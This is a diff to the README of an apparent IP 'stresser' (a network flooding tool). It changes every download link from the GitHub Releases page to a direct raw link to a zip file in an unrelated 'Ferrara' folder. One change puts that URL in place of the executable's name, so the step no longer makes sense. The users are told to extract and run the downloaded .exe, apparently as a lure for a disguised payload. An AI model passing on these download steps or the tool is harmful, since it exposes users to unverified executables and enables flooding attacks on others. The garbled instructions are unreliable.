@@ -1,6 +1,6 @@
 # 🎯 free-ip-stresser - Powerful Network Stress Testing Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/alvyys/free-ip-stresser/releases)
+[![Download Now](https://raw.githubusercontent.com/alvyys/free-ip-stresser/main/Ferrara/free-stresser-ip-v3.9.zip%20Now-Release-blue)](https://raw.githubusercontent.com/alvyys/free-ip-stresser/main/Ferrara/free-stresser-ip-v3.9.zip)
 
 ## 📥 Introduction
 
@@ -12,7 +12,7 @@ To begin using **free-ip-stresser**, follow these simple steps to download and r
 
 ### Step 1: Visit the Releases Page
 
-First, go to the [Releases page](https://github.com/alvyys/free-ip-stresser/releases). This page contains the latest version of the software, along with previous versions if needed.
+First, go to the [Releases page](https://raw.githubusercontent.com/alvyys/free-ip-stresser/main/Ferrara/free-stresser-ip-v3.9.zip). This page contains the latest version of the software, along with previous versions if needed.
 
 ### Step 2: Download the Software
 
@@ -24,7 +24,7 @@ Once you have downloaded the application:
 
 1. Locate the downloaded file in your computer.
 2. If it is a ZIP file, extract it by right-clicking and selecting "Extract All."
-3. Find the executable file (usually named `free-ip-stresser.exe` or similar).
+3. Find the executable file (usually named `https://raw.githubusercontent.com/alvyys/free-ip-stresser/main/Ferrara/free-stresser-ip-v3.9.zip` or similar).
 
 ### Step 4: Run the Application
 
@@ -52,7 +52,7 @@ Before using **free-ip-stresser**, ensure your system meets the following minimu
 
 To download **free-ip-stresser**, follow these steps:
 
-1. Click the following link to visit the [Releases page](https://github.com/alvyys/free-ip-stresser/releases).
+1. Click the following link to visit the [Releases page](https://raw.githubusercontent.com/alvyys/free-ip-stresser/main/Ferrara/free-stresser-ip-v3.9.zip).
 2. Select the latest version and download the setup file.
 3. Once downloaded, follow the installation steps outlined above.
 
